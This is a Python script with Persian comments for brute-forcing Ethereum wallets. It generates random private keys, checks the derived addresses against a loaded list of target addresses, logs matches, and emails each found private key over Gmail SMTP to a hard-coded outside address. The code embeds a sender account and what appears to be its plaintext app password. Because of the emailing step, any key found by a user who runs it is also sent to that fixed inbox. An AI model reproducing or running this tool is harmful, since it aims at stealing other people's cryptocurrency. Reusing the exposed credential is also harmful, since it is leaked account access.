import os
import time
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
try:
    from eth_account import Account
except ImportError:
    print("Error: 'eth_account' module not found. Run '!pip install eth-account' in Colab.")
    exit(1)

# تولید کلید هگزادسیمال ایمن
def _HexGen(size):
    return os.urandom(size // 2).hex()  # size=64 برای 32 بایت

# تبدیل هگز به آدرس اتریوم
def _HexToAddr(hex_key):
    private_key = "0x" + hex_key
    account = Account.from_key(private_key)
    address = account.address[2:].lower()  # حذف 0x
    return private_key, address

# بارگذاری 100,000 خط اول فایل هدف
def _LoadTargetFile(file_name, max_lines=100000):
    try:
        with open(file_name, "r", encoding="utf-8") as f:
            return {line.strip().split("\t")[0].lower() for i, line in enumerate(f) if line.strip() and i < max_lines}
    except FileNotFoundError:
        print(f"Error: File {file_name} not found.")
        return set()
    except IndexError:
        print("Error: Invalid TSV format.")
        return set()

# ارسال ایمیل
def send_email(sender, receiver, subject, body):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender, "xecy aomq ddms tmid")
        msg = MIMEMultipart()
        msg["From"] = sender
        msg["To"] = receiver
        msg["Subject"] = subject
        msg.attach(MIMEText(body))
        server.sendmail(sender, receiver, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False

# تابع بررسی کلید
def check_key(target, lock, match_buffer):
    hex_key = _HexGen(64)
    private_key, address = _HexToAddr(hex_key)

    if address in target:
        with lock:
            match_buffer.append((address, private_key))
        return True
    return False

# ذخیره دسته‌ای نتایج
def save_matches(match_buffer, lock, output_file="found.txt"):
    if match_buffer:
        with lock:
            with open(output_file, "a") as f:
                for address, private_key in match_buffer:
                    f.write(f"Address: {address}\n"
                            f"Private Key: {private_key}\n\n")

# ارسال ایمیل در نخ جداگانه
def send_email_async(address, private_key):
    sender = "pouriya.guitar@gmail.com"
    receiver = "tatalbet666@gmail.com"
    subject = "هش"
    body = (f"Address: {address}\n"
            f"Private Key: {private_key}\n")
    while True:
        if send_email(sender, receiver, subject, body):
            break
        time.sleep(10)

# حلقه اصلی
def MainCheck():
    global z, wf
    target_file = '/content/ethereum.tsv'
    Target = _LoadTargetFile(target_file)

    if not Target:
        print("No addresses loaded. Exiting.")
        return

    z = 0
    wf = 0
    lg = 0
    start_time = time.time()
    last_speed_check = start_time
    lock = threading.Lock()
    match_buffer = []  # بافر برای ذخیره تطبیق‌ها

    with ThreadPoolExecutor(max_workers=4) as executor:  # 4 نخ برای سرعت و پایداری
        while True:
            z += 1
            future = executor.submit(check_key, Target, lock, match_buffer)
            if future.result():
                wf += 1
                # ارسال ایمیل در نخ جداگانه
                address, private_key = match_buffer[-1]
                threading.Thread(target=send_email_async, args=(address, private_key)).start()

            # ذخیره دسته‌ای هر 100 تطبیق یا هر 100,000 کلید
            if len(match_buffer) >= 100 or z % 100000 == 0:
                save_matches(match_buffer, lock)
                match_buffer.clear()

            # نمایش سرعت هر 30 ثانیه
            current_time = time.time()
            if current_time - last_speed_check >= 30:
                elapsed_time = current_time - start_time
                keys_per_second = z / elapsed_time if elapsed_time > 0 else 0
                print(f"\nKeys per second: {keys_per_second:.2f}")
                last_speed_check = current_time

            if z % 100000 == 0:
                lg += 100000
                print(f"Generated: {lg} keys...")

            else:
                lct = time.localtime()
                tm = time.strftime("%Y-%m-%d %H:%M:%S", lct)
                print(f"[{tm}][Total: {z} Checked] #Found: {wf} ", end="\r")

if __name__ == '__main__':
    z = 0
    wf = 0
    t = threading.Thread(target=MainCheck)
    t.start()
    t.join()
